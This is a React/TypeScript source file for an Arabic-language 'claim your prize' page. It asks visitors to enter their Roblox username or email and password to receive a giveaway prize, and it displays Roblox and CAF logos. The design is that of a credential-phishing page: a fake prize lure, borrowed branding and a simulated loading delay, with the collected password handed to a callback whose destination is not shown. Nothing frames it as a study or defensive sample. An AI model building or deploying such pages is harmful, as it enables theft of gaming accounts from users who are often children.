
import React, { useState } from 'react';

interface LoginViewProps {
  prizeLabel: string;
  onSubmit: (user: string, pass: string) => void;
  onBack: () => void;
}

const LoginView: React.FC<LoginViewProps> = ({ prizeLabel, onSubmit, onBack }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      alert('يرجى ملء جميع الخانات');
      return;
    }
    setLoading(true);
    setTimeout(() => {
      onSubmit(username, password);
      setLoading(false);
    }, 1500);
  };

  return (
    <div className="max-w-md mx-auto animate-fadeIn">
      <div className="custom-glass rounded-3xl overflow-hidden shadow-2xl">
        <div className="bg-red-600 p-4 text-center text-white font-bold text-lg">
          تأكيد استلام الجائزة: {prizeLabel}
        </div>
        
        <form onSubmit={handleSubmit} className="p-8 space-y-6">
          <p className="text-white/80 text-center text-sm">
            لتلقي جائزة سجل دخولك بحساب روبلوكس المراد تلقي فيه الجائزة
          </p>

          <div className="space-y-4">
            <div>
              <label className="block text-white/70 text-sm mb-2 mr-1">اسم المستخدم أو البريد الإلكتروني</label>
              <div className="relative">
                <i className="fa-solid fa-user absolute right-4 top-1/2 -translate-y-1/2 text-white/30"></i>
                <input 
                  type="text"
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full pr-12 pl-4 py-4 rounded-xl bg-black/30 border border-white/10 text-white focus:outline-none focus:ring-2 focus:ring-red-500 text-right transition-all"
                  placeholder="Username / Email"
                />
              </div>
            </div>

            <div>
              <label className="block text-white/70 text-sm mb-2 mr-1">كلمة المرور</label>
              <div className="relative">
                <i className="fa-solid fa-lock absolute right-4 top-1/2 -translate-y-1/2 text-white/30"></i>
                <input 
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full pr-12 pl-4 py-4 rounded-xl bg-black/30 border border-white/10 text-white focus:outline-none focus:ring-2 focus:ring-red-500 text-right transition-all"
                  placeholder="Password"
                />
              </div>
            </div>
          </div>

          <button
            type="submit"
            disabled={loading}
            className={`w-full py-4 rounded-xl font-bold text-white transition-all shadow-lg flex items-center justify-center space-x-3 space-x-reverse
              ${loading ? 'bg-gray-600 cursor-not-allowed' : 'bg-red-600 hover:bg-red-500 active:scale-95'}
            `}
          >
            {loading ? (
              <i className="fa-solid fa-spinner animate-spin"></i>
            ) : (
              <>
                <span>الحصول على الجائزة الآن</span>
                <i className="fa-solid fa-gift"></i>
              </>
            )}
          </button>

          <div className="text-center pt-4 border-t border-white/10">
            <button 
              type="button"
              onClick={onBack}
              className="text-white/40 hover:text-white text-sm"
            >
              إلغاء واختيار جائزة أخرى
            </button>
          </div>
        </form>
      </div>

      <div className="mt-8 flex justify-center space-x-8 space-x-reverse grayscale opacity-50">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_logo.svg/2560px-Roblox_logo.svg.png" alt="Roblox" className="h-6" />
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/8c/CAF_logo.svg/1200px-CAF_logo.svg.png" alt="CAF" className="h-8" />
      </div>
    </div>
  );
};

export default LoginView;
